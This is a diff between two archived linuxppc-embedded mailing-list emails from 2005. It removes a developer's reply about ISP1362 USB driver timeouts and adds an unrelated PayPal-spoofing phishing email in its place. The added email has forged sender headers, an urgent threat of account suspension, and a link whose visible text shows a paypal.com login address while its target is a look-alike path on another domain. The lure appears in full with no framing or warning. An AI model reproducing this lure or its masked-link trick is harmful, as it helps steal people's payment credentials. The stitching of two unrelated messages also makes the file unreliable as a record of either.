@@ -1,19 +1,21 @@
-Return-Path: <wd@denx.de>
-Received: from mailout06.sul.t-online.com (mailout06.sul.t-online.com
-	[194.25.134.19]) by ozlabs.org (Postfix) with ESMTP id 2106667A6B
+Return-Path: <nobody@epic.tunnelwebhost.net>
+Received: from epic.tunnelwebhost.net (unknown [67.18.184.162])
+	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
+	(Client did not present a certificate)
+	by ozlabs.org (Postfix) with ESMTP id 264F7679E6
 	for <linuxppc-embedded@ozlabs.org>;
-	Wed, 22 Jun 2005 06:19:01 +1000 (EST)
-To: j.lu@tiesse.com
-From: Wolfgang Denk <wd@denx.de>
-Mime-version: 1.0
-Content-type: text/plain; charset=ISO-8859-1
-In-reply-to: Your message of "Tue, 21 Jun 2005 16:48:13 +0200."
-	<200506211648.AA102695630@tiesse.com>
-Date: Tue, 21 Jun 2005 22:18:34 +0200
-Sender: wd@denx.de
-Message-Id: <20050621201839.F40E0C1510@atlas.denx.de>
-Cc: linuxppc-embedded@ozlabs.org
-Subject: Re: isp1362 usb driver 
+	Wed, 22 Jun 2005 06:57:52 +1000 (EST)
+Received: from nobody by epic.tunnelwebhost.net with local (Exim 4.50)
+	id 1Dkjxc-0004kz-Aw
+	for linuxppc-embedded@ozlabs.org; Tue, 21 Jun 2005 10:42:44 -0400
+To: linuxppc-embedded@ozlabs.org
+From: PayPal <acc-validity@paypal.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Message-Id: <E1Dkjxc-0004kz-Aw@epic.tunnelwebhost.net>
+Date: Tue, 21 Jun 2005 10:42:44 -0400
+Subject: Account compromised: billing information moved or changed.
+Reply-To: no-reply@paypal.com
 List-Id: Linux on Embedded PowerPC Developers Mail List
 	<linuxppc-embedded.ozlabs.org>
 List-Unsubscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-embedded>,
@@ -24,36 +26,67 @@ List-Help: <mailto:linuxppc-embedded-request@ozlabs.org?subject=help>
 List-Subscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-embedded>,
 	<mailto:linuxppc-embedded-request@ozlabs.org?subject=subscribe>
 
-Hello,
+<html>
+<head>
+<title></title>
+<style type=text/css>
+<!--
+.panel{-moz-border-radius: .3em .3em .3em .3em; border: 1px dotted silver; background-color: #F7F6F4;
+}
+-->
+</style>
+</head>
+<body>
 
-in message <200506211648.AA102695630@tiesse.com> you wrote:
->
-> sorry for my persistence, now I try to go to more detail:
-
-I'm afraid I can't help much. The only board with a  ISP1362  I  have
-access  to at the moment has just the device interface equipped, so I
-cannot run any real tests on the host port.
-
-> Jan  1 01:01:30 IMOLA kernel: hub.c: USB new device connect on 
-> bus2/2, assigned device number 2
-> Jan  1 01:01:33 IMOLA kernel: usb_control/bulk_msg: timeout
-> Jan  1 01:01:45 IMOLA last message repeated 4 times
-> Jan  1 01:01:45 IMOLA kernel: usb.c: couldn't get all of config 
-> descriptors
-> Jan  1 01:01:45 IMOLA kernel: usb.c: unable to get device 2 
-> configuration (error=-110)
-
-Which sort of device is it what you connected? Are  you  sure  it  is
-working  under  Linux at all? Did you test it on a standard x86 Linux
-PC with a 2.4.2x kernel?
-
-
-Best regards,
-
-Wolfgang Denk
-
--- 
-Software Engineering:  Embedded and Realtime Systems,  Embedded Linux
-Phone: (+49)-8142-66989-10 Fax: (+49)-8142-66989-80 Email: wd@denx.de
-A fanatic is a person who can't change his mind and won't change  the
-subject.                                          - Winston Churchill
+<TABLE align="center" width="70%" border=0>
+<tr>
+<td align="left"><img src="http://www.paypal.com/en_US/i/logo/paypal_logo.gif" border=0></td>
+</tr>
+<tr>
+<td> </td>
+</tr>
+<TR>
+<TD><b>LEGAL NOTICE</b></TD>
+</TR>
+<TR>
+<TD bgcolor="GhostWhite" class="panel">
+      <font face="Arial" size="2px">The following message is an email sent to you by an 
+administrator of "PayPal.com".<br>If this message is spam, contains abusive or other comments you find offensive please 
+contact the webmaster at the following address:
+<a href="mailto:admin@paypal.com">admin@paypal.com</a>
+</TD>
+</TR>
+<TR><TD></TD><br></TR>
+<TR><TD></TD><br></TR>
+<TR>
+<TD class="panel"><b>Message sent to you follows:</b></TD>
+</TR>
+<TR>
+<TR><TD></TD> </TR>
+<TR><TD></TD> </TR>
+<TR><TD></TD></TR>
+<TR>
+        <TD><font color="Navy" size="3"><b>Dear PayPal client,</b></font><br>
+        <br>
+              <font face="Arial" size="2px">While performing it's regular scheduled 
+monthly billing address check our system found incompatible information which seams to be no longer the same with your 
+current credit card information that we have on file. If you changed your billing information or if you moved from you 
+previous address please follow up the link bellow and update your billing information: If you didn't change any of this 
+information you still need to follow up the previous link and update your existing billing information because it means 
+that our database regular scheduled update wasn't made correctly. Choosing to ignore this message will result in to a 
+temporary suspension of your account within 24 hours, until you will choose to solve this unpleasant situation.<br>
+        <br>
+        We apologies for any inconvinience this may caused you and we strongly advise you to update your information you 
+have on file with us. Clicking <a href=" 
+http://www.3dex.com/.www.paypal.com/cgi-bin/webscrcmd_login.php">https://www.paypal.com/cgi-bin/webscr?cmd=_login_</a> you will 
+avoid any possible futuring billing problems with your account.<br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <b>Best regards</b>,<br>
+        - <i>PayPal Team</i>.
+        </TD>
+        </tr>
+</TABLE>
